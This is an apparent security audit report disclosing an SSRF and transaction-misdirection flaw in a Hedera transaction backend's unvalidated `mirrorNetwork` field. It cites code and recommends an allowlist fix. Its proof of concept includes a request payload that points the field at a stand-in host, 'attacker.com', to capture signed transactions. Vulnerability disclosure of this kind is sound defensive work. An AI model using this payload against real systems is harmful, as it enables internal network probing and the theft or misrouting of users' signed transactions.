Audit Report

## Title
Unvalidated `mirrorNetwork` Field Allows Arbitrary Network Routing and SSRF During Transaction Execution

## Summary
The `mirrorNetwork` field in `CreateTransactionDto` accepts any arbitrary string with no allowlist enforcement. The raw value is stored in the database and later used by both `createTransactions` and `ExecuteService._executeTransaction` to build a Hedera SDK client, causing the backend to make outbound gRPC connections to any attacker-supplied host and to submit signed transactions against attacker-controlled infrastructure.

## Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` applies only `@IsNotEmpty()` and `@IsString()` to `mirrorNetwork`: [1](#0-0) 

No enum constraint, no allowlist check against `mainnet | testnet | previewnet | local-node`.

**Step 1 — creation path calls `getClientFromNetwork` with the raw value and persists it:**

`createTransactions` passes `dtos[0].mirrorNetwork` directly to `getClientFromNetwork`, then stores `data.mirrorNetwork` (which equals `dto.mirrorNetwork`) into the `Transaction` row: [2](#0-1) [3](#0-2) 

**Step 2 — `getClientFromNetwork` makes an outbound gRPC connection to the supplied URL:**

When the value is not one of the four known strings (`mainnet`, `testnet`, `previewnet`, `local-node`), the function falls through to the custom-network branch, opens a gRPC connection to the attacker-supplied host, and fetches the address book: [4](#0-3) 

**Step 3 — execution path re-uses the stored value:**

`ExecuteService._executeTransaction` calls `getClientFromNetwork(transaction.mirrorNetwork)` with the persisted value, then submits the fully-signed transaction to whatever nodes the attacker's address-book response advertised: [5](#0-4) 

**Node validation does not protect against this:**

`isTransactionValidForNodes` at line 935 of `transactions.service.ts` checks the transaction's node IDs against the client's network — but the client was built from the attacker's address book, so the attacker can craft the address book to include whatever node IDs are embedded in the transaction bytes, making the check pass trivially. [6](#0-5) 

## Impact Explanation

- **SSRF**: The backend makes outbound gRPC connections to an attacker-controlled host at two points in the transaction lifecycle (creation and execution). This can be used to probe internal services reachable from the backend pod (e.g., metadata endpoints, internal APIs, other microservices).
- **Transaction misdirection**: Fully-signed multi-party transactions (potentially carrying significant HBAR or token operations) are submitted to attacker-controlled infrastructure instead of the real Hedera network. The attacker receives the signed transaction bytes, can withhold submission, replay them later, or observe sensitive transaction contents.
- **Cross-network confusion**: An attacker can store `mirrorNetwork: "mainnet"` for a transaction whose bytes were intended for testnet (or vice versa), causing execution on the wrong network and permanent loss of funds if the transaction is valid on both.

## Likelihood Explanation

Any authenticated organization-mode user can reach `POST /transactions` without any elevated privilege. The `mirrorNetwork` field is a normal part of the API contract. No leaked credentials or admin access are required. The attacker only needs to run a gRPC server that speaks the Hedera SDK's `AddressBookQuery` protocol, which is publicly documented.

## Recommendation

Enforce an allowlist on `mirrorNetwork` at the DTO level using `class-validator`'s `@IsIn()` decorator:

```typescript
import { IsIn, IsNotEmpty, IsString } from 'class-validator';

@IsNotEmpty()
@IsString()
@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])
mirrorNetwork: string;
```

This should be applied in `CreateTransactionDto` at: [1](#0-0) 

If custom mirror nodes are a legitimate use case, they should be pre-registered by an administrator and referenced by ID rather than accepted as free-form URLs from end users.

## Proof of Concept

1. Start a gRPC server at `attacker.com:443` that responds to `AddressBookQuery` with a crafted `NodeAddressBook` containing node IDs that match the transaction bytes (e.g., `0.0.3`).
2. As an authenticated org user, POST to `/transactions`:
   ```json
   {
     "name": "test",
     "description": "test",
     "transactionBytes": "<valid_signed_bytes>",
     "signature": "<valid_signature>",
     "creatorKeyId": 1,
     "mirrorNetwork": "attacker.com"
   }
   ```
3. Observe the backend making a gRPC connection to `attacker.com:443` (SSRF hit #1) during `createTransactions` → `getClientFromNetwork`.
4. The transaction is saved with `mirrorNetwork = "attacker.com"`.
5. When the chain service triggers execution, `_executeTransaction` calls `getClientFromNetwork("attacker.com")` again (SSRF hit #2) and submits the signed transaction bytes to the attacker's nodes via `sdkTransaction.execute(client)`. [7](#0-6)

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction.dto.ts (L26-28)
```typescript
  @IsNotEmpty()
  @IsString()
  mirrorNetwork: string;
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L405-405)
```typescript
    const client = await getClientFromNetwork(dtos[0].mirrorNetwork);
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L449-449)
```typescript
            mirrorNetwork: data.mirrorNetwork,
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L934-937)
```typescript
    const allowedNodes = getNodeAccountIdsFromClientNetwork(client);
    if (!isTransactionValidForNodes(sdkTransaction, allowedNodes)) {
      throw new BadRequestException(ErrorCodes.TNVN);
    }
```

**File:** back-end/libs/common/src/utils/sdk/client.ts (L28-46)
```typescript
  if ([MAINNET, TESTNET, PREVIEWNET].includes(mirrorNetwork[0])) {
    return Client.forName(mirrorNetwork[0]);
  }

  if (mirrorNetwork[0] === LOCAL_NODE) {
    return Client.forNetwork(getLocalClientNetwork(process.env.NODE_ENV)).setMirrorNetwork(
      MirrorNetworkGRPC.LOCAL_NODE,
    );
  }

  const client = Client.forNetwork({}).setMirrorNetwork(
    MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0]),
  );

  const nodeAddressBook = await new AddressBookQuery()
    .setFileId(FileId.ADDRESS_BOOK)
    .execute(client);

  client.setNetworkFromAddressBook(nodeAddressBook);
```

**File:** back-end/libs/common/src/execute/execute.service.ts (L128-132)
```typescript
  private async _executeTransaction(
    transaction: Transaction,
    sdkTransaction: SDKTransaction,
  ): Promise<TransactionExecutedDto | null> {
    const client = await getClientFromNetwork(transaction.mirrorNetwork);
```

**File:** back-end/libs/common/src/execute/execute.service.ts (L143-145)
```typescript
    try {
      const response = await sdkTransaction.execute(client);
      const receipt = await response.getReceipt(client);
```
